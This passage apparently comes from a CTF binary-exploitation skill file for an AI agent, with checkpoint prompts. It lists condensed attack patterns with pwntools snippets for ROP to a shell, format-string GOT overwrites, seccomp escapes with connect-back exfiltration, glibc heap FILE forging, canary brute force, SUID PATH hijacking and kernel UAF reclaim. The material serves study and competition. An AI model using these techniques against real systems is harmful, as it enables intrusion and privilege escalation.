- Pitfalls: `execve`-per-conn rerolls — math void, must leak; `\x00`/`\x0a` truncated by `gets`/`strcpy` — use `read`/`recv` alphabet or skip.
- Sources: https://ctftime.org/writeup/10006 · https://github.com/turan-sec/cyberhackconf-2026-writeups/blob/main/pwn/safegreet/README.md · https://ctftime.org/writeup/21190

### W24 — Two-stage pivot read-to-bss (small overflow, Full RELRO)
- Signals: overflow fits only `rbp+rip`, writable `.bss`/heap, `read`/`fgets` PLT present.
- Steps: stage1 `flat({RBP: bss-8, RIP: leave_ret})` after `read(0,bss,big)` pre-fill → stage2 real chain lives at bss → verify `rsp` via `telescope` before stage2.
- Snippet: `stage1=flat({OFF_RBP:p64(bss),OFF_RIP:p64(leave_ret)}); stage2 at bss: [pop_rdi,binsh,system]`.
- Pitfalls: off-by-8 pivot executes shifted chain — verify `rsp` lands exactly; `leave=mov rsp,rbp;pop rbp;pop rip` — set `rbp=bss-8`-ish, not `bss`.
- Sources: https://exp10it.io/posts/hitcon-training-pwn-writeup · https://hacktricks.wiki/en/binary-exploitation/stack-overflow/stack-pivoting.html · https://jia.je/ctf-writeups/summer2026/stack_pivot.html

### W25 — ORW openat/fd fallbacks (seccomp execve-KILL)
- Signals: `seccomp-tools dump` shows 59 KILL, `open/openat+read+write` ALLOW, flag path unknown/fd pre-opened.
- Steps: `open` blocked→`openat(-100,path,0)` (257); `read` blocked→`pread64/readv`; `write` blocked→`writev/sendfile`; pre-opened→brute fds 3,4,5 `read+write` only.
- Snippet: `sc=asm(shellcraft.openat(-100,path,0)+shellcraft.read('rax','rsp',0x100)+shellcraft.write(1,'rsp',0x100))`.
- Pitfalls: silent-exit = KILL vs wrong-path — check status/signal; path placeholder `/flag.txt` — discover via `strings`/`getdents64`, never double-guess.
- Sources: https://ctftime.org/writeup/36159 · https://yuri08-qa210.github.io/pwnable.tw/orw/index.html · https://wiki.athena-ctf.com/docs/pwn/seccomp-bypass

### W26 — Fmt short-write order + numbwritten (Partial RELRO GOT)
- Signals: `printf(user)` + writable GOT + `win`/`system` target, 64b addrs at buffer end.
- Steps: split 4B/8B into 2B `hn` ascending → cumulative pad (`%<n>c`) in address order → `fmtstr_payload(OFF,{got:val},write_size='short',numbwritten=pad)`.
- Snippet: `fmtstr_payload(6,{elf.got.exit:elf.sym.main},write_size='short') # then 2nd round to system`.
- Pitfalls: descending writes wrap past 0xffff — sort ascending; prior-emitted bytes count — account `numbwritten`, else math off by pad.
- Sources: https://ctftime.org/writeup/25903 · https://ctftime.org/writeup/37448 · https://github.com/utisss/foreverctf-writeups/blob/master/pwn-printf-got.md

### W27 — Fmt exit-GOT loop for 2 rounds (no loop-back symbol)
- Signals: `vuln` calls `exit`, no `main` loop, fmt present, need leak then write.
- Steps: round1 fmt overwrite `exit@GOT=main/vuln` + leak libc/canary/PIE → round2 (re-entered) fmt write `printf@GOT=system` or RET→ROP.
- Snippet: `p.sendline(fmtstr_payload(OFF,{elf.got.exit:elf.sym.main})); # now looped; leak; then fmtstr_payload(OFF2,{elf.got.printf:system})`.
- Pitfalls: exit args consumed — ensure format reaches before `exit(1)` flush; second-round offset may shift — re-sweep `%i$p`.
- Sources: https://ctftime.org/writeup/25903 · https://ctftime.org/writeup/22136 · https://github.com/datajerk/ctf-write-ups/blob/master/redpwnctf2020/dead-canary/README.md

### W28 — Canary source chooser (fmt vs NUL vs fork)
- Signals: canary on + overflow, plus one of: fmt reflect / `read` NUL-echo / fork server.
- Steps: fmt→`%k$p` stable-`00`-tail = canary; NUL-echo→overwrite low `00` then `show` prints canary; fork→byte-brute `256×7` with continue-vs-smash oracle.
- Snippet: `if fmt: sweep(1..30) classify(00-tail,55..,7f..); elif nul: send(pad+b'\xff'); canary=u64(b'\x00'+recv(7))`.
- Pitfalls: reroll-stable `00`-tail is NOT canary (canary stable per-proc, PIE/libc change) — confirm across 2 runs; `gets` alphabet skips `00/0a`.
- Sources: https://github.com/srdnlen/srdnlenctf-2026_public/blob/main/pwn_echo/writeup.md · https://ctftime.org/writeup/32410 · https://ctftime.org/writeup/10006

### W29 — PIE rebase per-connection (no hardcode)
- Signals: PIE on + any leak (stack/GOT/.text), Full/Partial RELRO, remote ASLR.
- Steps: leak `.text` ptr → `elf.address=leak-known_off` → re-derive `pop_rdi/ret/win` per-conn → never reuse prior-run base; verify `elf.address` range via `vmmap`.
- Snippet: `elf.address=pie_leak-0x1234; pop_rdi=next(elf.search(asm('pop rdi;ret'))) # per-conn`.
- Pitfalls: stale-PIE cross-run pairing dies remotely — re-leak in SAME conn that exploits; low-12 must match known symbol tail or offset site wrong.
- Sources: https://ctftime.org/writeup/34569 · https://ctftime.org/writeup/12043 · https://github.com/ljagiello/ctf-skills/blob/main/ctf-pwn/overflow-basics.md

### W30 — Seccomp diagnose + arch/charset escape (KILL vs clean + shellcode limits)
- Signals: shellcode/ROP silent-exit or empty-output, `seccomp-tools dump` available, tiny/charset-limited buffer.
- Steps: dump filter → classify KILL (signal, zero-out) vs clean-empty (status 0, wrong path/fd) → ORW/`openat`/fd-brute; if shellcode: opcode/alpha/palindrome/mov-only + connect-back exfil.
- Snippet: `seccomp-tools dump ./vuln; # KILL→ORW sc; clean→fix path/fd; restricted→gelcode/palindrome/movsh template`.
- Pitfalls: fixing gadgets for a hang wastes tries — hang is I/O framing (`sendlineafter` prompt), not gadgets; 32b `sysenter` switch needs 32b frame — do not mix 64b regs.
- Sources: https://github.com/nobodyisnobody/write-ups/tree/main/RedpwnCTF.2021/pwn/gelcode-2 · https://github.com/nobodyisnobody/write-ups/tree/main/KITCTFCTF.2022/pwn/movsh · https://github.com/nobodyisnobody/write-ups/blob/main/0CTF.TCTF.2023/pwn/Nothing.is.True/README.md

Reasoning Checkpoint: `Writeup patterns complete — W1..W30 appended, era/version-gated, sources triangulated — proceed to Validation?`
## Writeup-Distilled Patterns R2 (W31..W60) — index only
> Bodies in `techniques/writeup-patterns-r2-1.md` (W31–W40), `-r2-2.md` (W41–W50), `-r2-3.md` (W51–W60). Row = signals → steps → snippet → pitfalls → R2 sources.
### W31 — 2.39 tcache-count-7 + calloc Tangerine (→ techniques/writeup-patterns-r2-1.md)
- Sig: 2.39 + calloc reachable + counts look wrong; Steps: leak heap/libc → saturate bin to 7 → poison entries via calloc path.
- Code: `free×7 saturate; edit(p64(protect(pos,t)))`; Pit: calloc shares counts[] — plan +1 fill; Src: https://github.com/HyggeHalcyon/CTFs/blob/main/2024/%C3%A5ngstrom/heapify/exploit.py · https://github.com/shellphish/how2heap/blob/master/glibc_2.39/tcache_stashing_unlink_attack.c
### W32 — safe-link double-protect + z3/nibble bootstrap 2.38-2.41 (→ techniques/writeup-patterns-r2-1.md)
- Sig: ≥2.32 mangled fd + no heap ptr + fork/z3; Steps: read enc → reveal/z3/nibble-1/16 → vmmap-verify → protect(pos,t), check double-protect via tcache dump.
- Code: `reveal=(pos>>12)^enc; z3:(res>>12)^res==leak`; Pit: raw p64 aborts; parallelize nibbles; Src: https://github.com/SleepTheGod/HackTheBoxWriteups/blob/main/Heapify.md · https://ctftime.org/writeup/40715
### W33 — cross-bin smallbin→tcache stash unlink + calloc (→ techniques/writeup-patterns-r2-1.md)
- Sig: 2.29-2.39 smallbin+tcache + calloc + size-change; Steps: shrink size → free to smallbin → calloc triggers stash→tcache with attacker fd → poison.
- Code: `edit(a,b'A'*off+p16(0x20)); free(a)`; Pit: size must stay valid; guard chunk; W31 count math; Src: https://github.com/shellphish/how2heap/blob/master/glibc_2.39/tcache_stashing_unlink_attack.c · https://ctftime.org/writeup/40715
### W34 — largebin bk_nextsize sorted-insert smaller-wins 2.30+ (→ techniques/writeup-patterns-r2-1.md)
- Sig: ≥0x400 + largebin UAF + tcache isolated + Full RELRO + 2.38/2.39; Steps: groom p1>p2 → leak libc → corrupt bk_nextsize=target-0x20 → alloc smaller p2 writes heap addr.
- Code: `bk_nextsize=target-0x20; require size(p2)<size(p1)`; Pit: larger-first aborts post-2.30; raw nextsize needs shipped offsets; Src: https://ctftime.org/writeup/40715 · https://github.com/yaklang/hack-skills/blob/main/skills/heap-exploitation/HOUSE_OF_TECHNIQUES.md
### W35 — House-of-Cat all-version IO 2.35/2.39 deltas (→ techniques/writeup-patterns-r2-1.md)
- Sig: heap+libc leaks + alloc/write + exit path + hooks dead; Steps: real _IO_wfile_jumps → version-adjusted FILE+wide-data forge → plant to _IO_list_all → exit trigger.
- Code: `vtable=_IO_wfile_jumps-0x20; _wide_data=scratch`; Pit: 2.35≠2.39 blobs — re-derive on shipped libc; wrong trigger==wrong FILE; Src: https://bbs.kanxue.com/thread-273895.htm · https://xz.aliyun.com/news/15379
### W36 — House-of-Emma cookie-write + ROL17 mangle (→ techniques/writeup-patterns-r2-1.md)
- Sig: ≥2.34 FILE write + libc leak + guard present; Steps: target _IO_cookie slot → forge rol(ptr,0x11)^guard (leak fs:0x30) → codecvt/system slot → flush with fp=attacker bytes.
- Code: `stored=rol(p,0x11)^guard`; Pit: guard unknown=crash; main vtable must be real; Src: https://github.com/Mistyovo/pwn-rag-kb/blob/master/heap/house-of-emma.md · https://xz.aliyun.com/news/12380
### W37 — House-of-Kiwi malloc_assert + fflush(stderr) (→ techniques/writeup-patterns-r2-1.md)
- Sig: 2.29+ sandbox heap + stderr + top-shrink; Steps: shrink top<MINSIZE → arm __malloc_assert → helper+0xA0/0xA8 + _IO_file_sync hijack → next malloc fires fflush(stderr)→setcontext+61.
- Code: `top.size=0x10 # arms assert`; Pit: needs 2 writes; main vtable real; wrong size=clean abort; Src: https://4xura.com/binex/heap/house-of-kiwi · https://github.com/Mistyovo/pwn-rag-kb/blob/master/heap/house-of-kiwi.md
### W38 — House-of-Pig str_overflow + stash unlink (→ techniques/writeup-patterns-r2-1.md)
- Sig: 2.31+ + largebin + _IO_list_all + stash path + hooks dead; Steps: largebin→_IO_list_all → forge _IO_str_overflow FILE → inner malloc fires stash unlink → overwrite exit-funcs/retaddr.
- Code: `fake._overflow=_IO_str_overflow # stash follows`; Pit: needs triple (largebin+FILE+stash); malloc size must be tcache-eligible; Src: https://samuzora.com/posts/fsop/fsop-analysis · https://github.com/yaklang/hack-skills/blob/main/skills/heap-exploitation/HOUSE_OF_TECHNIQUES.md
### W39 — House-of-Husk double-largebin + printf_table (→ techniques/writeup-patterns-r2-1.md)
- Sig: 2.35 + double-largebin + __printf_function_table; Steps: groom 2 largebins → hijack printf table → printf-trigger dispatch → stack-wash ROP/ORW.
- Code: `hijack(__printf_function_table,fake); printf(fmt,controlled)`; Pit: version-specific offset; needs heap+libc leaks; trigger args controlled; Src: https://github.com/yaklang/hack-skills/blob/main/skills/heap-exploitation/HOUSE_OF_TECHNIQUES.md · https://github.com/todordev/pentesting-skills/blob/main/skills/heap-exploitation/IO_FILE_EXPLOITATION.md
### W40 — Tangerine/Muney count-saturation bridge 2.39 (→ techniques/writeup-patterns-r2-1.md)
- Sig: 2.39 tcache+unsorted + no fd overwrite + calloc; Steps: fill counts→7 → Muney bridge (unsorted bk=target-0x10 while saturated) → alloc returns target → FILE/retaddr finish.
- Code: `fill_to_7(bin); corrupt(unsorted.bk,target-0x10)`; Pit: off-by-one routes wrong bin — verify dumps; guard chunk; Src: https://github.com/shellphish/how2heap/blob/master/glibc_2.39/tcache_stashing_unlink_attack.c · https://github.com/HyggeHalcyon/CTFs/blob/main/2024/%C3%A5ngstrom/heapify/exploit.py
### W41 — seccomp ORW golf sub-60B + openat (→ techniques/writeup-patterns-r2-2.md)
- Sig: execve-KILL + open/openat+read+write ALLOW + tiny/filtered buffer; Steps: dump filter → openat(-100) if open blocked → golf push-path ORW; staged 24B read-jump if too small.
- Code: `asm(openat(-100,path,0)+read(rax,rsp,0x100)+write(1,rsp,0x100))`; Pit: read→pread64/readv, write→writev/sendfile; pre-opened fds skip open (3,4,5); Src: https://wiki.athena-ctf.com/docs/pwn/shell-code · https://github.com/KorekKayu/IKONA-Security/blob/main/IKONA_HACKSKILLS/sandbox-escape-techniques/SECCOMP_BYPASS.md
### W42 — seccomp-notify/ptrace/arch-confusion concept (→ techniques/writeup-patterns-r2-2.md)
- Sig: tight ALLOW-list + ptrace/io_uring/32-64 surface; Steps: enumerate sendfile/splice/tee alternatives → ptrace-inject into child → check int0x80-vs-syscall gaps → <5.1 skips uring.
- Code: `sendfile(1,3,0,0x100) # no read/write needed`; Pit: 32b frame never mixes 64b regs; notify needs child; re-dump per hypothesis; Src: https://github.com/KorekKayu/IKONA-Security/blob/main/IKONA_HACKSKILLS/sandbox-escape-techniques/SECCOMP_BYPASS.md · https://seclists.org/oss-sec/2024/q2/172
### W43 — SROP read-first + read-len rax=15, no pop-rax (→ techniques/writeup-patterns-r2-2.md)
- Sig: no gadgets + read + syscall;ret + overflow; Steps: overflow→read(0,frame,big) → send exactly 15B so rax=15 → syscall;ret restores frame (rax=59/rdi=binsh/rip=syscall, or ORW).
- Code: `frame.rax=59; frame.rdi=binsh; frame.rip=syscall_ret`; Pit: frame at exact rsp (off-by-8=fail); stable stack; exact 15B; Src: https://wiki.athena-ctf.com/docs/pwn/sigreturn-rop · https://www.cse.iitb.ac.in/~khushangsingla/blog/writeups/2k23/iitbctf/writeup-iitbctf-round1-srop
### W44 — SROP arm64 x8/x0/pc + svc + vDSO (→ techniques/writeup-patterns-r2-2.md)
- Sig: aarch64 + svc + x8=0x8b path + overflow; Steps: overflow→sigreturn site (binary or leaked vDSO+0x7b0) → arm64 frame x8=execve/x0=binsh/pc=svc → mprotect-chain variant if filtered.
- Code: `frame.x8=SYS_execve; frame.x0=binsh; frame.pc=svc`; Pit: x86 names void; vDSO needs leak; env-ptr trick if no string; Src: https://hacktricks.wiki/hi/binary-exploitation/rop-return-oriented-programing/srop-sigreturn-oriented-programming/srop-arm64.html · https://book.jorianwoltjer.com/binary-exploitation/return-oriented-programming-rop/sigreturn-oriented-programming-srop
### W45 — SROP constrained UTF8/mov-only + mprotect pivot (→ techniques/writeup-patterns-r2-2.md)
- Sig: SROP-capable + charset-limited/NX + mprotect; Steps: compliant stage-1 read → SROP mprotect(RWX) → pivot to stage-2 ORW/shellcode.
- Code: `frame.rax=10; rdi=page; rsi=0x1000; rdx=7`; Pit: two-stage mandatory; page-align; exact pad; Src: https://github.com/ljagiello/ctf-skills/blob/main/ctf-pwn/advanced-exploits.md · https://ctftime.org/writeup/39717
### W46 — ret2dlresolve-64 data_addr + reloc-index edge (→ techniques/writeup-patterns-r2-2.md)
- Sig: 64b + Partial/No RELRO + overflow + read/gets + .bss + no leak; Steps: Ret2dlresolvePayload(system,/bin/sh) → read(0,data_addr) forge → ret2dlresolve → 2nd round feeds payload; verify dump shows read→[plt_init].
- Code: `dl=Ret2dlresolvePayload(elf,'system',['/bin/sh']); rop.read(0,dl.data_addr); rop.ret2dlresolve(dl)`; Pit: plt_init fault=regenerate; data_addr truly writable; Full RELRO check first; Src: https://github.com/JorianWoltjer/practical-ctf/blob/main/binary-exploitation/return-oriented-programming-rop/ret2dlresolve.md · https://hacktricks.wiki/en/binary-exploitation/rop-return-oriented-programing/ret2dlresolve.html
### W47 — fake-link_map JMPREL forge, no-plt-init (→ techniques/writeup-patterns-r2-2.md)
- Sig: 64b stripped/custom PLT + .bss + read + no leak; Steps: forge link_map (DT_JMPREL/SYMTAB/STRTAB→.bss) + Rel/Sym index-0 → read writes map → call _dl_runtime_resolve(map,0) with rdi=/bin/sh.
- Code: `linkmap+=p64(fake+0x18); rop.call(resolve,[linkmap,0])`; Pit: DT math exact; Rel/Rela sizes differ 32/64; same 2nd-round discipline; Src: https://github.com/XDSEC/MoeCTF_2025/blob/main/official_writeups/Pwn/MoeCTF%202025%20Pwn%20Writeup.md · https://ctf-wiki.org/en/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve
### W48 — fmt ascending-hn + numbwritten + exit-GOT two-round (→ techniques/writeup-patterns-r2-2.md)
- Sig: printf(user) + Partial RELRO + no loop; Steps: sweep %i$p → round-1 exit@GOT=main (loop+leaks) → round-2 ascending hn + cumulative %c + numbwritten; re-sweep offset round-2.
- Code: `fmtstr_payload(OFF,{got.exit:main},'short') # then fmtstr_payload(OFF2,{got.printf:system},'short')`; Pit: sort ascending (no 0xffff wrap); account prior bytes; exit_ARGS timing; Src: https://github.com/yrudwls/ctf-writeup/blob/main/angstromCTF/2024/pwn/bap/README.md · https://www.cnblogs.com/undefined/articles/18827559
### W49 — fmt 1B/2B precision + wrap-avoid + re-sweep (→ techniques/writeup-patterns-r2-2.md)
- Sig: fmt write + tight deltas + post-loop shift; Steps: sort shorts ascending → hhn where high bytes match → post-round-1 re-sweep → read-back verify before ROP.
- Code: `fmtstr_payload(OFF2,{got:val&0xffff},'short') # ascending, re-swept`; Pit: unsorted corrupts pads; hhn/hn match delta; \x0a truncated by gets; Src: https://github.com/yrudwls/ctf-writeup/blob/main/angstromCTF/2024/pwn/bap/README.md · https://github.com/binneko/ctf-writeups/blob/main/2025/umdctf/pwn/gambling2/README.md
### W50 — fork canary 256x7 + NUL-ABI + checkpoint (→ techniques/writeup-patterns-r2-2.md)
- Sig: fork-no-execve + canary + overflow + oracle + no fmt; Steps: verify stability ×3 → LSB 00 → brute 7B (~1792) with continue-vs-smash oracle → checkpoint prefix.bin per byte → budget probes×RTT.
- Code: `send(prefix+canary+p8(g)); ok=b'MARKER' in clean(0.5)`; Pit: gets skips 00/0a; execve-reroll voids math; pin one worker generation; Src: https://hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/stack-canaries/bf-forked-stack-canaries.html · https://blog.beatman.tw/en/articles/69ed65acc3a1bf5c78cef870
### W51 — fork PIE partial-overwrite 1/16 + reroll classifier (→ techniques/writeup-patterns-r2-3.md)
- Sig: fork-no-execve + PIE + nearby target + low-12 stable; Steps: stability ×3 → overwrite RIP low 1-2B (1/16 per nibble) → classify normal/crash/502 → prefer over full force.
- Code: `flat({OFF:p8((low&0xf000)|0x3)}) # 16-try loop`; Pit: gets truncates 00/0a; multi-parent pools — pin generation; 3× no-change=re-groom; Src: https://hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/stack-canaries/bf-forked-stack-canaries.html · https://jia.je/ctf-writeups/2025-09-12-fortid-ctf-2025/pwn.html
### W52 — static ret2syscall no-libc + bss-binsh (→ techniques/writeup-patterns-r2-3.md)
- Sig: static + NX + no system + read + syscall + .bss + overflow; Steps: inventory pop-rdi/rsi/rax/rdx + syscall + movers → read(0,bss,8) stages /bin/sh → rax=59/rdi=bss/rsi=rdx=0 → syscall.
- Code: `pop_rax_rdx_rbx; 0x3b,0,0; pop_rdi,bss; syscall`; Pit: movers clobber extra regs; /bin/sh rarely present — stage it; int0x80 is 32b-only; Src: https://github.com/alhamrizvi-cloud/Binary-Exploitation/blob/main/09.%20Ret2Syscall%20/README.md · https://hacktricks.wiki/en/binary-exploitation/rop-return-oriented-programing/rop-syscall-execv/index.html
### W53 — static SROP + mprotect + read-pivot (→ techniques/writeup-patterns-r2-3.md)
- Sig: static + NX + no call gadgets + sigreturn + mprotect; Steps: SROP mprotect(page,RWX) → read-pivot stages shellcode/ORW → pivot rsp → seccomp prefers ORW frame.
- Code: `frame.rax=10; rdi=page&~0xfff; rsi=0x1000; rdx=7`; Pit: page-align or EINVAL; exact pad; verify __NR_rt_sigreturn per arch; Src: https://github.com/utsavthakur/agenticskills/blob/main/binary-protection-bypass/PROTECTION_BYPASS_MATRIX.md · https://wiki.athena-ctf.com/docs/pwn/sigreturn-rop
### W54 — musl mallocng meta + atexit finish (→ techniques/writeup-patterns-r2-3.md)
- Sig: musl-linked + heap menu + no glibc behavior; Steps: OOB leaks meta->mem → arbitrary write redirects alloc → target musl atexit/__exit_funcs → exit trigger; use musl docs, never glibc offsets.
- Code: `leak=view(meta); alloc_to(atexit,p64(wrap)) # musl only`; Pit: glibc tricks void — ldd-check first; meta stride per class — debugger-confirm; Src: https://justinapplegate.me/2025/uiuctf-doremi · https://github.com/sigpwny/UIUCTF-2025-Public/blob/main/WRITEUPS.md
### W55 — mimalloc fixed-chunk free-list + non-heap ptr (→ techniques/writeup-patterns-r2-3.md)
- Sig: LD_PRELOAD libmimalloc + fixed notes + UAF; Steps: free → read free-list next (non-heap ptrs live) → leak directly → overwrite free-list → alloc to atexit/retaddr/table.
- Code: `head=show_freed() # may be non-heap; edit(slot,p64(target))`; Pit: fixed classes only; 2.2.x encoding — debugger-confirm; same-run leaks; Src: https://justinapplegate.me/2025/uiuctf-doremi · https://github.com/XDSEC/MoeCTF_2025/blob/main/official_writeups/Pwn/MoeCTF%202025%20Pwn%20Writeup.md
### W56 — uclibc/custom-allocator metadata abuse (→ techniques/writeup-patterns-r2-3.md)
- Sig: non-ptmalloc (uclibc/talloc/nginx/game) + next/size/is_free; Steps: map ITS layout from decompile → forge pool/header spanning target → next alloc returns it → GOT read + dispatch/hook overwrite per trigger.
- Code: `forge_pool(end=target+size); alloc() # returns target`; Pit: ptmalloc offsets fiction — re-derive; test free-order in gdb; Src: https://github.com/ljagiello/ctf-skills/blob/main/ctf-pwn/heap-fsop.md · https://github.com/yaklang/hack-skills/blob/main/skills/heap-exploitation/HOUSE_OF_TECHNIQUES.md
### W57 — io_uring SQ/CQ restricted-syscall concept userland (→ techniques/writeup-patterns-r2-3.md)
- Sig: userland + io_uring_setup reachable / Syscalls-2 lineage; Steps: mmap shared rings → SQE describes syscall → io_uring_enter submit → CQE result; models bypass as submit/complete; CVE code is reference only.
- Code: `mmap(rings); sqe.opcode=WANTED; io_uring_enter(fd,1,1,0)`; Pit: concept-only for CTF; liburing semantics; <5.1 no uring — check version; Src: https://github.com/ysanatomic/io_uring_LPE-CVE-2024-0582/blob/main/exploit.c · https://github.com/AmesianX/kernel-exploit-dojo/blob/main/2024/UIUCTF_2024/Pwn_Syscalls_2/writeup/writeup01/solve_io_uring.txt
### W58 — Rust fat-ptr/UAF + drop-glue + vtable (→ techniques/writeup-patterns-r2-3.md)
- Sig: Rust + Vec/slice/UAF menu + panic/.rustc strings; Steps: corrupt fat-ptr len → OOB R/W → hijack trait vtable/Drop glue → dispatch to ROP with controlled arg; 2B partial often suffices.
- Code: `corrupt(len,huge); overwrite(drop_glue,rop) # Rust dispatch`; Pit: layout per rustc — no C offsets; panic aborts — trigger via return/drop; prove low-12 first; Src: https://jia.je/ctf-writeups/2025-09-12-fortid-ctf-2025/pwn.html · https://cybersecurityelite.com/ctf-writeups/l3akctf-2026-pwn-writeup
### W59 — Rust/CET SHSTK/IBT + no-ret JOP/COP (→ techniques/writeup-patterns-r2-3.md)
- Sig: 2025+ binary + CET/SHSTK/IBT + no plain ret; Steps: confirm via checksec/readelf → JOP dispatcher + fn-ptr table (noret lineage) or CET-compatible SROP → same leak discipline → system/ORW.
- Code: `table=[pop_rdi,binsh,system]; dispatcher=jop # no ret`; Pit: ret-chains fault (looks like movaps); IBT needs endbr landings; Src: https://github.com/XDSEC/MoeCTF_2025/blob/main/official_writeups/Pwn/MoeCTF%202025%20Pwn%20Writeup.md · https://github.com/yrudwls/ctf-writeup/blob/main/angstromCTF/2024/pwn/bap/README.md
### W60 — pointer-guard fs:0x30 + ROL17 exit-funcs forge (→ techniques/writeup-patterns-r2-3.md)
- Sig: ≥2.34 + __exit_funcs/dtor_list + guard nonzero + exit path; Steps: leak guard fs:0x30 → forge rol(p,0x11)^guard per slot, next=NULL → poison chunk → exit walks to controlled call.
- Code: `mangle=((p<<0x11)|(p>>(64-0x11)))^g & 2**64-1`; Pit: never assume guard; chain order matters; tls offsets per version — vmmap-confirm; Src: https://github.com/todordev/pentesting-skills/blob/main/skills/heap-exploitation/IO_FILE_EXPLOITATION.md · https://samuzora.com/posts/fsop/fsop-analysis
Reasoning Checkpoint: `R2 index complete — W31..W60 condensed, bodies in techniques/, SKILL.md under 1100 — proceed to Validation?`

## EASY-FIRST ladder (2026 training refresh — run BEFORE any W-pattern, ≤20 min)
1. `checksec --file=./vuln; file ./vuln; strings -n6 ./vuln | grep -iE 'win|flag|/bin/sh|system'` — read source if given for `win()/system`.
2. Offset: `cyclic 200 > p; run; cyclic_find($eip/$rip)`. 32-bit args sit at `ebp+8` — add 4B dummy ret.
3. `win()` present + no canary/PIE → ret2win: `b'A'*off + p64(win)`. With args: `+ p64(ret) + p64(arg1)`.
4. No `win`, NX on, `puts@plt/got + main` → 2-stage: leak `puts` → libc base → `system('/bin/sh')`; prepend extra `ret` if `movaps` faults (stack align).
5. `printf(user_input)` anywhere → `%p.` dump first: canary = value ending `00`, PIE = `0x55../0x56..` minus `main` offset; then build payload.
6. Menu with print/write/free/flag + `scanf(%s)` → heap0-3 intro: overflow print buf into flag buf, or free→realloc-same-size UAF then print.
7. Always test LOCAL then REMOTE; re-leak per run (ASLR/PIE shift). Three crashes, no leak → escalate, don't blind-fuzz.

## R4 field patterns (browser-swarm 2026 — from 224 new writeups)
- Seccomp ORW stub: allowed `openat/mmap/writev` only → `openat(-100,flag); mmap(rw); dup2(1,1001); writev(1001)` (fd≤1000 often blocked).
- PATH-hijack (`hash-only` class): SUID `flaghasher` calling bare `md5sum` → symlink `cat` earlier in PATH (`export PATH=.:$PATH`); rbash variant → `ssh -t` + python pty.
- No-hooks glibc (2.35+): corrupt top size → `__malloc_assert` → House-of-Cat `_IO_wfile_jumps` → `setcontext`; House-of-Orange when only one live chunk.
- Race stretch: userfaultfd blocked → `/dev/shm` + `fallocate` page-cache pressure for deterministic window (watch OOM).
- Kernel tiny-UAF (kmalloc-32): reclaim with `seq_operations`/`tty_struct`, overwrite ops; `modprobe_path` trigger when writable.
- `movaps` fault in `system` → prepend extra `ret`; fork-server canary → brute byte-by-byte, then single ROP.

Deep-read bodies (15 complete articles): techniques/r5-deep-reads.md.
